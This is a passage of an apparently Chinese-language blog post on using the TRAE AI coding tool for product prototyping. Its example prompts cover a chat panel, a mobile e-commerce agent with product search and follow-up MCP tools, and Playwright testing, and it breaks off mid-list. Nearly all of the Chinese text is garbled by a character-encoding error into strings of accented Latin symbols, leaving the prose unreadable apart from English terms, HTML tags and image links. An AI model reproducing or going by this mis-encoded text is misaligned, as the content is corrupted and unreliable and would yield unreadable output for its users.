<p><strong>å®æˆ˜æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34073c018a0d4b78a1395732d660f60e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=Hq098%2B%2F1mjUNjB6Hbtiwn2UjRr8%3D" alt="show_682105790_1770623599386.png" loading="lazy"/></p>
<p>ç°åœ¨æˆ‘å¸Œæœ›åœ¨æˆ‘çš„é¡µé¢çš„å³ä¾§åŒºåŸŸï¼Œå¢åŠ ä¸€ä¸ªèŠå¤©çš„çª—å£ã€‚</p>
<blockquote>
<ol>
<li>
<p>è¿™ä¸ªèŠå¤©çš„çª—å£ï¼Œæ˜¯ç”±é¡¶éƒ¨å¯¼èˆªæ å³ä¾§åŒºåŸŸï¼Œclaim anniversary çš„å®¹å™¨å·¦ä¾§çš„ä¸€ä¸ª chat çš„ icon å¤„æ¿€æ´»çš„ã€‚</p>
</li>
<li>
<p>æ¿€æ´»èŠå¤©é¢æ¿åï¼Œä¼šå¯¹åº”çš„å°†å³ä¾§çš„ main å†…å®¹å®¹å™¨ï¼Œå¾€å·¦è‡ªé€‚åº”æŒ¤è¿‡å»ã€‚</p>
</li>
<li>
<p>è€Œè¿™ä¸ªèŠå¤©é¢æ¿ï¼Œç”± 3 ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p>
<p>é¡¶éƒ¨æ˜¯èŠå¤©çª—å£çš„æ ‡é¢˜</p>
<p>ä¸­é—´æ˜¯èŠå¤©æ¶ˆæ¯çš„å±•ç¤ºåŒºï¼Œåˆ†ä¸ºç”¨æˆ·ä¸ agent çš„æ¶ˆæ¯ï¼Œå¹¶ä¸”ä¸éœ€è¦å¤´åƒ</p>
<p>ä¸‹æ–¹æ˜¯ç”¨æˆ·å‘æ¶ˆæ¯çš„è¾“å…¥æ¡†ï¼Œä»¥åŠå‘é€æŒ‰é’®åŒº</p>
</li>
</ol>
<p>åœ¨ä½ å¸®æˆ‘å®ç°æ—¶ï¼Œ<strong>éœ€è¦ç¬¦åˆæˆ‘çš„</strong> <em><strong>FRONTEND_SPEC.md</strong></em> <strong>è§„èŒƒã€‚</strong></p>
</blockquote>
<p>åœ¨å®ç°äº†åŸºç¡€äº¤äº’åï¼Œæˆ‘åˆæƒ³å¢åŠ ä¸€äº›æ•ˆæœï¼Œæ¯”å¦‚æ‰“å­—æœºæ•ˆæœã€çŸ¥è¯†åº“æŸ¥è¯¢ç­‰ã€‚åŒæ ·çš„ï¼Œä¹Ÿæ˜¯ä¾èµ–ä¸Šæ–¹æå‡ºçš„æ–¹æ³•ï¼š<strong>ç”±ç”¨æˆ·æ“ä½œè§†è§’å‡ºå‘ï¼Œæè¿°æ¸…æ¥šèµ·å§‹ã€æ“ä½œã€åé¦ˆã€ä½ç½®ã€å†…å®¹ã€‚</strong></p>
<p><strong>å®Œæˆæ•ˆæœï¼šæœ€ç»ˆæˆ‘ä»¬å°±èƒ½å¤Ÿå¾—åˆ°ä¸€ä¸ªå¦‚ä¸‹è§†é¢‘æ‰€ç¤ºçš„ä¸€ä¸ªå¸¦å‰ç«¯äº¤äº’çš„HTMLçš„å¯äº¤äº’å¼åŸå‹</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1fac20734b64655a34a2bdf58bc20d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=OzrW9YZC%2FxrUX3bgaYZeUdqdAYY%3D" alt="20260129104946_rec_-convert (1).gif" loading="lazy"/></p>
<h3 data-id="heading-11"><strong>åœºæ™¯äºŒï¼š0-1 çš„é¡¹ç›®åŸå‹ä¸é€»è¾‘éªŒè¯</strong></h3>
<p>å¦‚æœè¯´éœ€æ±‚è¿­ä»£æ˜¯â€œæœ¯â€ï¼Œé‚£ä¹ˆ 0-1 çš„é¡¹ç›®éªŒè¯åˆ™æ›´è€ƒéªŒäº§å“ç»ç†çš„â€œé“â€â€”â€”å°†ä¸€ä¸ªæƒ³æ³•ï¼Œå¿«é€Ÿè½åœ°ä¸ºå¯éªŒè¯çš„ MVPã€‚</p>
<p><strong>å·¥ä½œæµå¯¹æ¯”ï¼š</strong></p>
<p><strong>è¿‡å» (Old School)</strong></p>
<ul>
<li>
<p><strong>æ¥å£çŒœè°œï¼š</strong> åªèƒ½å¯¹ç€ä¸€å †æ¥å£æ–‡æ¡£å¹²çªçœ¼ï¼Œçœ‹ç€å­—æ®µçŒœæµ‹åç«¯é€»è¾‘ã€‚éªŒè¯è·¯å¾„æçŸ­ï¼Œä¸­é—´è¿‡ç¨‹å®Œå…¨æ˜¯é»‘ç›’ã€‚</p>
</li>
<li>
<p><strong>é€»è¾‘ç›²åŒºï¼š</strong> é‡åˆ°å¤æ‚ç®—æ³•ã€Agent äº¤äº’ç­‰ï¼Œå®Œå…¨ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚ä¸ç ”å‘è®¨è®ºæ—¶ï¼Œå› ä¸æ‡‚å®ç°ç»†èŠ‚ï¼Œéš¾ä»¥æå‡ºå»ºè®¾æ€§æ„è§ï¼Œæ›´æ— æ³•æœ‰æ•ˆæŠŠæ§é¡¹ç›®é£é™©ã€‚</p>
</li>
</ul>
<p><strong>ç°åœ¨ (TRAE Flow)</strong></p>
<ul>
<li>
<p><strong>ç™½ç›’æŒæ§ï¼š</strong> é€šè¿‡è‡ªç„¶è¯­è¨€æè¿°ï¼Œè®© TRAE æŠŠå®Œæ•´é€»è¾‘è·‘é€šï¼Œç»“åˆå…¶è¾“å‡ºçš„ Mermaid æµç¨‹å›¾ï¼Œå½»åº•çœ‹æ‡‚ä»£ç èƒŒåçš„ä¸šåŠ¡æµè½¬ã€‚</p>
</li>
<li>
<p><strong>åå‘è¾“å‡ºï¼š</strong> ä½ ä¸å†åªæ˜¯éœ€æ±‚çš„æå‡ºè€…ã€‚ç°åœ¨ï¼Œä½ å¯ä»¥ç›´æ¥æ„å»ºä¸€ä¸ªé€»è¾‘åˆç†ã€ç”šè‡³ä»£ç å¯ç”¨çš„æ–¹æ¡ˆï¼Œâ€œç”©â€ç»™ç ”å‘ï¼šâ€œç…§ç€è¿™ä¸ªï¼Œåˆåˆ°ä¸»å¹²ä»£ç é‡Œå»ã€‚â€</p>
</li>
</ul>
<p><strong>æ ¸å¿ƒä»·å€¼ï¼šè¿™å·²ç»ä¸æ˜¯ç®€å•çš„æ•ˆç‡æå‡ï¼Œè€Œæ˜¯äº§å“ç»ç†æ ¸å¿ƒèƒ½åŠ›çš„é£è·ƒâ€”â€”æˆ‘ä»¬çœŸæ­£è·å¾—äº†å®šä¹‰å’ŒéªŒè¯æŠ€æœ¯æ–¹æ¡ˆçš„èƒ½åŠ›ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22645b5421144c138f4fe3cac0f193d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=dxiQCLi9RtsyVi%2B4qh5O5RIrgdQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12"><strong>å®æˆ˜æ¡ˆä¾‹ï¼šç”µå•† Agent çš„ 0-1 æ­å»º</strong></h3>
<blockquote>
<p><strong>TRAE é…ç½®æ¸…å•</strong></p>
<ul>
<li><strong>æ¨¡å‹ï¼š</strong> gemini-3-pro-preview</li>
<li><strong>æ™ºèƒ½ä½“ï¼š</strong> Builder with MCP</li>
<li><strong>MCPï¼š</strong> Playwright</li>
</ul>
</blockquote>
<p><strong>éœ€æ±‚èƒŒæ™¯ï¼š</strong> åšä¸€ä¸ªç”µå•†åœºæ™¯çš„ agentï¼Œç›®æ ‡æ˜¯Cç«¯ç”¨æˆ·ã€‚å®ƒèƒ½å¤Ÿå¸®æˆ‘ä»¬åšåŸºæœ¬çš„å•†å“çš„æœç´¢ï¼Œä»¥åŠè®©ç”¨æˆ·ç›´æ¥æŒ‡å®šå¯¹åº”çš„å•†å“ã€‚</p>
<p><strong>æ ¸å¿ƒæ€è·¯ä¸åœºæ™¯ä¸€å®Œå…¨ä¸€è‡´ï¼šå°æ­¥å¿«è·‘ï¼Œå¢é‡è¿­ä»£ã€‚</strong></p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šæ­å»ºåŸºç¡€èŠå¤©é¡µé¢</strong></p>
<p><strong>0-1é¡¹ç›®å¯åŠ¨æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<blockquote>
<p>æˆ‘çš„è¿™ä¸ªé¡¹ç›®æ˜¯ä¸€ä¸ªå¯¹è¯å¼çš„ç”µå•† agentã€‚å¹¶ä¸”æ˜¯ç§»åŠ¨ç«¯å°ºå¯¸çš„ã€‚æ‰€ä»¥è¯·ä½ ä»¥ç§»åŠ¨ç«¯iPhone12 çš„å°ºå¯¸ï¼Œå¸®æˆ‘åˆ›å»ºä¸€ä¸ªåŸºç¡€çš„ agent çš„èŠå¤©é¡µé¢ã€‚å‰ç«¯ä½¿ç”¨ react çš„æŠ€æœ¯æ–¹æ¡ˆ</p>
<p>è¿™ä¸ªèŠå¤©é¡µé¢çš„ç»“æ„æ˜¯ï¼Œé¡¶éƒ¨æ˜¯å¯¹è¯çš„æ ‡é¢˜ã€‚ä¸­é—´æ˜¯ agent ä¸ç”¨æˆ·çš„æ¶ˆæ¯è®°å½•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¤´åƒã€‚åº•éƒ¨æ˜¯ç”¨æˆ·çš„è¾“å…¥æ¡†ï¼Œä»¥åŠå‘é€æŒ‰é’®</p>
<p>ç°åœ¨è¯·ä½ å¸®æˆ‘å®ç°è¿™ä¸ªé¡¹ç›®çš„åŸºç¡€é¡µé¢ç»“æ„</p>
</blockquote>
<p><strong>ä¸ºäº†åç»­è¿­ä»£æ–¹ä¾¿ï¼Œå¯ä»¥è¡¥å……ä»¥ä¸‹ 2 ä¸ªä¼˜åŒ–ç‚¹ï¼š</strong></p>
<p><strong>1. ä¼˜åŒ– classname</strong></p>
<blockquote>
<p>è¯·ä½ å°†æˆ‘å‰ç«¯é¡µé¢çš„ classname åšè§„èŒƒåŒ–å¤„ç†ï¼Œæ–¹ä¾¿æˆ‘ä»¥åèƒ½å¤Ÿç›´æ¥é€šè¿‡å‰ç«¯é¡µé¢çš„ classname æ‰¾åˆ°å¯¹åº”çš„ä»£ç ï¼Œè€Œä¸æ˜¯ç”¨ react ç”Ÿæˆçš„ classnameã€‚</p>
</blockquote>
<p><strong>2. åˆ›å»º start è„šæœ¬</strong></p>
<blockquote>
<p>è¯·ä½ å¸®æˆ‘åˆ›å»ºä¸€ä¸ª sh çš„ start çš„è„šæœ¬ï¼Œå¹¶ä¸”å›ºå®šç«¯å£å¯åŠ¨ï¼Œå½“ç›®æ ‡ç«¯å£è¢«å ç”¨æ—¶ï¼Œä½ å¯ä»¥æ¸…ç†æ‰è¢«å ç”¨çš„ç«¯å£è¿›ç¨‹ã€‚ç„¶åå†è¿›è¡Œå¯åŠ¨ã€‚åŒæ—¶æˆ‘å¸Œæœ›è¿™ä¸ªè„šæœ¬å†å¯åŠ¨åï¼Œèƒ½å¤Ÿåœ¨ç»ˆç«¯ç­”æ‰“å°å‡ºæˆ‘é¡¹ç›®çš„è·¯å¾„ï¼Œæ–¹ä¾¿æˆ‘åç»­è®¿é—®</p>
</blockquote>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€é˜¶æ®µå°±åšå¥½äº†ï¼šä¸€ä¸ªåŸºç¡€çš„å‰ç«¯é¡µé¢ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ad265f8b1ab47e9b4b3d4a80eb69cce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=cBaQ55SiWpwtuq0s1APaoRKoXxQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-13"><strong>ç¬¬äºŒæ­¥ï¼šæ¥å…¥åŸºç¡€å¯¹è¯èƒ½åŠ›</strong></h4>
<p>è¿™ä¸€æ­¥å¼€å§‹æ¶‰åŠåç«¯é€»è¾‘ã€‚å¦‚æœä½ å¯¹æŠ€æœ¯å®ç°ä¸ç†Ÿï¼Œæ²¡å…³ç³»ï¼Œå…ˆè®© TRAE æˆä¸ºä½ çš„â€œæŠ€æœ¯é¡¾é—®â€ï¼Œè®©ä»–ç»™ä½ å†™ä¸€ä»½å®ç°æ–‡æ¡£ã€‚å¹¶è¦æ±‚åœ¨ä½ ç¡®è®¤ä¹‹å‰ï¼Œä¸è®¸åŠ¨ä»»ä½•ä»£ç ã€‚</p>
<p><strong>â€œæ–‡æ¡£å…ˆè¡Œâ€æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<p>æˆ‘ç°åœ¨æ‰“ç®—åœ¨æˆ‘çš„é¡¹ç›®é‡Œå®ç°çœŸæ­£çš„ai å¯¹è¯ã€‚å¹¶ä¸”æˆ‘ä½¿ç”¨çš„æ˜¯è±†åŒ…çš„æ¨¡å‹ã€‚</p>
<blockquote>
<p>æˆ‘å¸Œæœ›å®ç°åï¼Œèƒ½å¤Ÿåšå¤§ï¼Œ ç”¨æˆ·åœ¨è¾“å…¥æ¡†å†…è¾“å…¥æ–‡æœ¬ï¼Œç‚¹å‡»å‘é€åï¼Œèƒ½å¤Ÿè®©è±†åŒ…åœ¨æ€è€ƒåè¿›è¡Œå›å¤ï¼Œå°±è·Ÿç°åœ¨çš„å¾ˆå¤š agent äº§å“ä¸€æ ·ï¼Œèƒ½å¤Ÿçœ‹åˆ°æŠ˜å çš„ thinkingï¼Œä»¥åŠæœ€ç»ˆçš„å›å¤çš„æ–‡æ¡ˆã€‚åŒæ—¶è¿™ä¸ª think é»˜è®¤å¯èƒ½æ˜¯æŠ˜å çš„çŠ¶æ€çš„ã€‚ç”¨æˆ·å¯ä»¥è¿›è¡Œå±•å¼€ï¼Œä½†å±•å¼€ä¹Ÿåªæ˜¯åœ¨ä¸€å®šçš„é«˜åº¦ä¸‹æŸ¥çœ‹ thinking çš„æ–‡æœ¬ã€‚</p>
<p>åŒæ—¶å‘¢ï¼Œæˆ‘ä¹Ÿå¸Œæœ›åœ¨ç”¨æˆ·å‘é€ç¬¬äºŒæ¡æ¶ˆæ¯åï¼Œai èƒ½å¤Ÿäº†è§£æˆ‘çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”åŸºäºæˆ‘çš„ä¸Šä¸‹æ–‡ï¼Œç»§ç»­æ¥ç»™æˆ‘è¿›è¡Œå›å¤ã€‚</p>
<p>è¯·ä½ æ ¹æ®æˆ‘ä»¥ä¸Šçš„éœ€æ±‚ï¼Œå¸®æˆ‘å†™ä¸€ä»½å®ç°çš„ mdæ–‡æ¡£ï¼Œå¹¶ä¸”åœ¨å¾—åˆ°æˆ‘å¼€å§‹ç ”å‘ä»£ç çš„ç¡®è®¤æ¶ˆæ¯å‰ï¼Œä¸è¦ä¿®æ”¹æˆ‘çš„ä»»ä½•ä»£ç æ–‡ä»¶</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c48e0622ab342a6ae2438f866e891fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=TarWEecg%2BMiHYVQOh3vqoWr2Pa8%3D" alt="" loading="lazy"/></p>
<p>å®é™…ä¸Šï¼Œè®© TRAE å¸®ä½ ç¼–å†™å®ç°æ–‡æ¡£ï¼Œèƒ½å¤Ÿåç»­è®©å®ƒå®ç°çš„æ›´å‡†ç¡®ã€‚å¯¹äºå®ç°æ–¹æ¡ˆä¸ç¡®å®šçš„åœ°æ–¹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥åœ¨ä¸æ–­çš„è·Ÿ TRAE äº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œé€æ­¥å®Œå–„æ–‡æ¡£ã€‚</p>
<p><strong>åœ¨ TRAE å®Œæˆåï¼ŒåŒæ ·ä½¿ç”¨ playwrightmcp æ‰“å¼€æˆ‘çš„é¡¹ç›®ï¼Œå¹¶ä¸”æ¨¡æ‹Ÿç”¨æˆ·èµ°å®Œæ•´ä¸ªæµç¨‹ã€‚</strong></p>
<p>ç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªæ»¡è¶³äº†å‰åç«¯çš„åŸºç¡€é¡¹ç›®å®ç°äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9763af69f91148aa9887f26e8a5b716c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=%2BGcVTG%2BCLExCKGzzJcSLzr63GX8%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-14"><strong>ç¬¬ä¸‰æ­¥ï¼šå®ç°æ ¸å¿ƒä¸šåŠ¡é€»è¾‘â€”â€”å•†å“æœç´¢</strong></h4>
<p>å†ç»§ç»­ç¬¬ä¸‰ä¸ªå­ä»»åŠ¡ï¼šä¸ºç»„ä»¶å®ç°æœç´¢å•†å“ã€‚</p>
<p>æ€è·¯ç›¸åŒï¼Œå¦‚æœæˆ‘ä»¬è‡ªå·±ä¸æ¸…æ¥šè¦å¦‚ä½•å®ç°ï¼Œå°±è®© TRAE æ ¹æ®æˆ‘ä»¬çš„éœ€æ±‚ï¼Œåˆ›å»ºä¸€ä¸ªå®ç°æ–‡æ¡£ã€‚</p>
<p><strong>è¿™é‡Œæˆ‘å°±å¿«é€Ÿçš„ç›´æ¥é€šè¿‡éœ€æ±‚è¿›è¡Œæé—®å®ç°äº†ï¼š</strong></p>
<blockquote>
<p>ç°åœ¨è¯·ä½ å¸®æˆ‘åœ¨è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œä¸ºè¿™ä¸ª agent å®ç°åœ¨å¯¹è¯è¿‡ç¨‹ä¸­ï¼Œèƒ½å¤Ÿå¸®ç”¨æˆ·åšå•†å“æœç´¢çš„è¿™ä¸ªèƒ½åŠ›ã€‚</p>
<p>è¦æƒ³å®ç°è¿™ä¸ªèƒ½åŠ›ï¼Œé¦–å…ˆä½ éœ€è¦å¸®æˆ‘åˆ›å»ºä¸€ä¸ªæœ¬åœ°çš„æ•°æ®åº“ï¼Œå­˜å‚¨å•†å“çš„ä¿¡æ¯ã€‚å…¶ä¸­éœ€è¦è‡³å°‘åŒ…å«å•†å“ idï¼Œå•†å“ä¸»å›¾ï¼Œå•†å“æ ‡é¢˜ï¼Œå•†å“ä»·æ ¼ï¼Œå•†å“è¯¦æƒ…æè¿°çš„ä¿¡æ¯ã€‚å•†å“å›¾ç‰‡ä½ å¯ä»¥ä» usplash ä¸Šéšæœºè·å–å¯ä»¥è®¿é—®çš„å•†å“å›¾ç‰‡å°±å¯ä»¥äº†ã€‚</p>
<p>é‚£æˆ‘å¸Œæœ›åœ¨ç”¨æˆ·ä¸ agent çš„å¯¹è¯äº¤äº’ä¸­ï¼Œèƒ½å¤Ÿè¯†åˆ«ç”¨æˆ·å½“å‰çš„æ„å›¾æ˜¯å¦æ¶‰åŠåˆ°å•†å“çš„æœç´¢ã€‚å¦‚æœæ¶‰åŠåˆ°å•†å“æœç´¢ï¼Œè¯·ä½ è°ƒç”¨å•†å“æœç´¢çš„è¿™ä¸ª mcpï¼ˆè¿™ä¸ª mcp ä¹Ÿéœ€è¦ä½ æ ¹æ®ä¸Šé¢è¦æ±‚ä½ åˆ›å»ºçš„æ•°æ®åº“æ¥å®ç°ï¼‰ï¼Œå°†ç”¨æˆ·çš„æé—®ï¼Œè½¬æ¢æˆå•†å“æ ‡é¢˜æœç´¢çš„å…³é”®è¯ï¼Œå¹¶é€šè¿‡æ¥å£æœç´¢å‡ºå•†å“ã€‚</p>
<p>åœ¨æ‹¿åˆ°å•†å“çš„ä¿¡æ¯åï¼Œæˆ‘è¦æ±‚ agent éœ€è¦ç»™æˆ‘è¿”å›ä¸€ä¸ªå¯äº¤äº’çš„å•†å“å¡ç‰‡çš„æ¶ˆæ¯èµ·æ³¡ï¼Œå¹¶ä¸”æ”¯æŒåˆ†é¡µï¼Œä¸€é¡µ 4 ä¸ªã€‚æœ€å¤š 5 é¡µä¹Ÿå°±æ˜¯ 20 ä¸ªå•†å“ã€‚</p>
<p>åœ¨å•†å“å¡ç‰‡ä¸Šéœ€è¦å‘ˆç°æ¯ä¸€ä¸ªå•†å“çš„ä¸»å›¾ï¼Œæ ‡é¢˜ï¼Œä»¥åŠä»·æ ¼ã€‚åŒæ—¶æ¯ä¸€ä¸ªå•†å“å¡ç‰‡çš„å³ä¸Šè§’æˆ‘å¸Œæœ›éƒ½æœ‰ä¸€ä¸ªæ–‡æœ¬çš„è¿½é—®æŒ‰é’®ã€‚</p>
<p>å½“ç”¨æˆ·ç‚¹å‡»äº†è¿™ä¸ªè¿½é—®åï¼Œèƒ½å¤Ÿåœ¨ç”¨æˆ·çš„è¾“å…¥æ¡†ä¸Šæ–¹æœ‰ä¸€ä¸ªå‘ˆç°äº†å½“å‰æ­£åœ¨è¿½é—®å“ªä¸ªå•†å“çš„ä¸€ä¸ªäº¤äº’ã€‚</p>
<p>å¹¶ä¸”å½“ç”¨æˆ·åœ¨è¿½é—®çŠ¶æ€ä¸‹å‘é€æ¶ˆæ¯æ—¶ï¼Œåœ¨ç”¨æˆ·çš„æ¶ˆæ¯æ°”æ³¡ä¸­ï¼Œéœ€è¦æºå¸¦ä¸Šè¢«è¿½é—®å•†å“çš„ tag çš„äº¤äº’æ˜¾ç¤ºã€‚</p>
<p>åŒæ—¶ï¼Œæˆ‘ä¹Ÿå¸Œæœ›ä½ èƒ½å¤Ÿæœ‰å¦ä¸€ä¸ªåº”å¯¹å•†å“è¿½é—®çš„ mcpã€‚è¿™ä¸ª mcp åœ¨è¯†åˆ«åˆ°ç”¨æˆ·çš„è¿½é—®åï¼Œèƒ½å¤Ÿæ ¹æ®ç”¨æˆ·è¿½é—®çš„å•†å“ idï¼Œå»æ•°æ®åº“ä¸­æŸ¥è¯¢å‡ºè¿™ä¸ªå•†å“çš„è¯¦æƒ…æè¿°ä¿¡æ¯ï¼Œå¹¶ä¸”æ ¹æ®è¯¥å•†å“çš„è¯¦æƒ…æè¿°ä¿¡æ¯ï¼Œç»™ä¸ç”¨æˆ·æ–‡æœ¬æè¿°ã€‚</p>
<p>ä»¥ä¸Šçš„æ•´ä¸ªæµç¨‹ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘æ¨¡æ‹Ÿï¼Œæˆ‘å¸Œæœ›æ‰€æœ‰çš„å•†å“æ ‡é¢˜éƒ½æºå¸¦ç€ï¼Œé£è¡£è¿™ä¸ªå…³é”®è¯ã€‚å¹¶ä¸”åœ¨ä½ å®Œæˆä»£ç å®ç°åï¼Œæˆ‘å¸Œæœ›ä½ ä½¿ç”¨ playwrightmcpï¼Œä»¥ç”¨æˆ·åœ¨æœç´¢é£è¡£ï¼Œä»¥åŠé’ˆå¯¹æŸä¸ªé£è¡£åšè¿½é—®çš„åœºæ™¯ã€‚å¸®æˆ‘å®Œæˆä¸€è½®å•†å“æœç´¢ï¼Œä»¥åŠå•†å“è¿½é—®çš„äº¤äº’ä¸é€»è¾‘æµ‹è¯•ï¼Œç¡®ä¿ä½ çš„å®ç°æ˜¯ç¬¦åˆæˆ‘çš„éœ€æ±‚çš„</p>
</blockquote>
<p>å³ä¾¿ç»™å‡ºäº†ä»¥ä¸Šè¯¦å°½çš„æŒ‡ä»¤ï¼ŒTRAE çš„åˆç‰ˆå®ç°ä¹Ÿå¯èƒ½å­˜åœ¨é—®é¢˜ã€‚æ²¡å…³ç³»ï¼Œç»§ç»­é€šè¿‡è¿½é—®æ¥ä¿®æ­£ã€‚</p>
<blockquote>
<p>æˆ‘å‘ç°äº†å‡ ä¸ªé—®é¢˜ï¼Œè¯·ä½ å¸®æˆ‘åšå‡ºä¿®æ”¹</p>
<ol>
<li>æˆ‘çš„é¡¹ç›®çš„é¡µé¢å°ºå¯¸ï¼Œéœ€è¦ä¸¥æ ¼æŒ‰ç…§ç§»åŠ¨ç«¯çš„å°ºå¯¸ã€‚ä¸èƒ½å¤Ÿå› ä¸ºæ¶ˆæ¯æ°”æ³¡ä¸­å†…å®¹çš„é•¿çŸ­ï¼Œè€Œæ’‘å¼€äº†æ•´ä¸ªé¡¹ç›®é¡µé¢å‘ˆç°ã€‚</li>
<li>æˆ‘å¸Œæœ›åœ¨è§¦å‘è°ƒç”¨å·¥å…·æ—¶ï¼Œèƒ½å¤Ÿæœ‰åƒä¸€èˆ¬çš„ agent äº§å“ä¸€æ ·çš„é‚£ç§æ­£åœ¨è°ƒç”¨xx å·¥å…·çš„äº¤äº’</li>
<li>æ•´ä½“çš„åç«¯çš„å®ç°æ€è·¯ï¼Œåº”è¯¥æ˜¯åŸºäº ReAct çš„æ ¸å¿ƒç†å¿µï¼Œä¹Ÿå°±æ˜¯ä¼šæ¶‰åŠåˆ°ç”¨æˆ·çš„ä¸€æ¡æ¶ˆæ¯ï¼Œå¯èƒ½ä¼šè§¦å‘å¤šæ¬¡ ai çš„è¯·æ±‚ã€‚ç¬¬ä¸€æ¬¡è¯·æ±‚å¯èƒ½æ˜¯ai åˆ¤æ–­éœ€è¦è°ƒç”¨å·¥å…·ï¼Œè€Œè·å–å·¥å…·çš„ç»“æœï¼Œç¬¬äºŒæ¬¡è¯·æ±‚å°±æ˜¯ ai ç»“åˆç€å·¥å…·è¿”å›çš„ç»“æœï¼Œæ¥è¿›è¡Œå›å¤ã€‚</li>
<li>æ‰€ä»¥æ—¢ç„¶åç«¯çš„å®ç°æ€è·¯åŸºäº ReAct çš„å•ä»»åŠ¡å¤šè½®æ€è€ƒè¯·æ±‚çš„æ€è·¯ï¼Œæ‰€ä»¥å¯¹åº”çš„å‰ç«¯çš„é…å¥—äº¤äº’ä¹Ÿéœ€è¦å¸®æˆ‘åšå‡ºå¯¹åº”çš„è°ƒæ•´ä¸ä¼˜åŒ–</li>
</ol>
</blockquote>
<p><strong>æœ€ç»ˆæˆæœï¼šå®Œæˆä¸€ä¸ªå‰åç«¯å®Œæ•´çš„ç”µå•† Agent MVP</strong>ï¼Œåç»­å¯ä»¥åŸºäºè¿™ä¸ªé¡¹ç›®ï¼Œåšä¸€äº›éœ€æ±‚çš„é€»è¾‘éªŒè¯ï¼Œæˆ–è€…å¤æ‚é€»è¾‘çš„è¿­ä»£ç­‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecad3ef843fb4571a5cb17cd115cb6ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=yowILSOIKzzvWe3%2Bi8Z%2F2K73%2BpY%3D" alt="20260129143746_rec_-convert (1).gif" loading="lazy"/></p>
<p>è¿™ä¸ªè¿‡ç¨‹çš„ä»·å€¼åœ¨äºï¼Œå®ƒè®©æˆ‘ä»¬åƒæ¶æ„å¸ˆä¸€æ ·æ€è€ƒï¼Œå°†ä¸€ä¸ªå¤æ‚çš„ä¸šåŠ¡æµç¨‹ï¼Œæ‹†è§£ä¸ºä¸€ç³»åˆ—æ¸…æ™°çš„æ¨¡å—ã€‚è€Œ TRAEï¼Œåˆ™å°†æˆ‘ä»¬çš„æ€è€ƒå˜ä¸ºç°å®ã€‚</p>
<h4 data-id="heading-15"><strong>åœºæ™¯ä¸‰ï¼šæ–‡æ¡£çš„ç¼–å†™ä¸å¯¹é½</strong></h4>
<p>äº§å“ç»ç†ä¸ä»…è¦åˆ›é€ ï¼Œæ›´è¦é¢‘ç¹åŒæ­¥ä¸å¯¹é½ã€‚æ— è®ºæ˜¯ä¸ç ”å‘å¯¹é½æ–¹æ¡ˆï¼Œè¿˜æ˜¯å‘è€æ¿æ±‡æŠ¥è¿›å±•ï¼Œæ¸…æ™°çš„æ–‡æ¡£å’Œé€»è¾‘å›¾éƒ½æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p><strong>å·¥ä½œæµå¯¹æ¯”ï¼š</strong></p>
<p><strong>è¿‡å» (Old School)</strong></p>
<ul>
<li>
<p><strong>ç»“æ„åŒ–åœ°ç‹±ï¼š</strong> æ”¶é›†èµ„æ–™å®¹æ˜“ï¼Œæ•´ç†æˆé€»è¾‘æ¸…æ™°çš„æ–‡æ¡£éš¾ã€‚åœ¨ PPT é‡Œç”»æ¡†æ¶å›¾ã€æµç¨‹å›¾ï¼Œåå¤è°ƒæ•´å´æ€»è§‰å¾—é€»è¾‘ä¸é€šã€‚</p>
</li>
<li>
